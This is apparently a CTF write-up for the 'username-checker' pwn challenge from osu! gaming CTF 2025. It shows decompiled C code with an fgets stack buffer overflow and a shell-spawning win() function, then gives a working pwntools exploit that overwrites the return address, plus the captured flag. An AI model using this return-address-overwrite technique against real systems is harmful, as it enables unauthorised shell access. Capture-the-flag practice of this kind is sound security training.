---
title: username-checker

published: 2025-10-27

description: Classic pwn buffer overflow attack

tags: [pwn, buffer overflow, python]
category: osu! gaming CTF 2025
---

# username checker

> Having trouble finding the perfect osu! username?
> Check whether your usernames are valid using username-checker!

## Files

```
❯ file *
checker:    ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fcf233c90bc0e306027cc14ca4f302293d2f4b5c, for GNU/Linux 3.2.0, not stripped
Dockerfile: ASCII text
flag.txt:   ASCII text, with no line terminators
nsjail.cfg: ASCII text
```

We have a 64 bit executable `checker` which we need to crack, opening it in ghidra we can get the source code

```c
void main(void)
{
    setvbuf(_stdin, 0, 2, 0);
    setvbuf(_stdout, 0, 2, 0);
    puts("~-~ username-checker ~-~");
    check_username();
    return;
}

// WARNING: Variable defined which should be unmapped: var_10h

undefined8 check_username(void)
{
    int32_t iVar1;
    int64_t iVar2;
    uint64_t uVar3;
    undefined8 uVar4;
    int64_t *piVar5;
    uint64_t uVar6;
    char *s1;
    int64_t var_1ch;
    int64_t var_10h;
    
    printf("please enter a username you want to check: ");
    fgets(&s1, 0x80, _stdin);
    iVar2 = strcspn(&s1, data.00402054);
    *(undefined *)((int64_t)&s1 + iVar2) = 0;
    uVar3 = strlen(&s1);
    if (uVar3 < 0x10) {
        for (var_1ch._0_4_ = 0; uVar6 = (uint64_t)(int32_t)var_1ch, uVar3 = strlen(&s1), uVar6 < uVar3;
            var_1ch._0_4_ = (int32_t)var_1ch + 1) {
            piVar5 = (int64_t *)__ctype_b_loc();
            if (((((*(uint16_t *)((int64_t)*(char *)((int64_t)&s1 + (int64_t)(int32_t)var_1ch) * 2 + *piVar5) & 8) == 0)
                 && (*(char *)((int64_t)&s1 + (int64_t)(int32_t)var_1ch) != '_')) &&
                (*(char *)((int64_t)&s1 + (int64_t)(int32_t)var_1ch) != '[')) &&
               (((*(char *)((int64_t)&s1 + (int64_t)(int32_t)var_1ch) != ']' &&
                 (*(char *)((int64_t)&s1 + (int64_t)(int32_t)var_1ch) != '-')) &&
                (*(char *)((int64_t)&s1 + (int64_t)(int32_t)var_1ch) != ' ')))) {
                puts("username contains invalid characters");
                return 1;
            }
        }
        iVar1 = strcmp(&s1, "super_secret_username");
        if (iVar1 == 0) {
            win();
            uVar4 = 0;
        } else {
            puts("username is valid!");
            uVar4 = 0;
        }
    } else {
        puts("username is too long");
        uVar4 = 1;
    }
    return uVar4;
}

void win(void)
{
    puts("how did you get here?");
    system("/bin/sh");
    return;
}
```

## Solving

Basically what this code does is takes in our input and checks it length and then against `super_secret_username`

But the key thing is that fgets takes in 0x80 bytes which is way too much so if we input too much we can get a segfault

This means we can overwrite the return address so we can jump to the function `win`

If we input `pwn cyclic` into our code and check in gdb where it jumped we can find that the offset is 72 bytes

Now we can write our pwntools exploit:

```python
from pwn import *
elf = ELF('./checker')
win = elf.symbols.get('win', 0)
ret = next(elf.search(asm('ret')))

payload = b'A'*72
payload += p64(ret)
payload += p64(win)
#p = process("./checker")
p = remote('username-checker.challs.sekai.team', 1337)
#p = gdb.debug("./checker", gdbscript="b win")
p.sendline(payload)
p.interactive()
```

Running this gives us a shell and now we can `cat flag.txt` giving us the flag: `osu{thats_not_a_val1d_username_:(}`
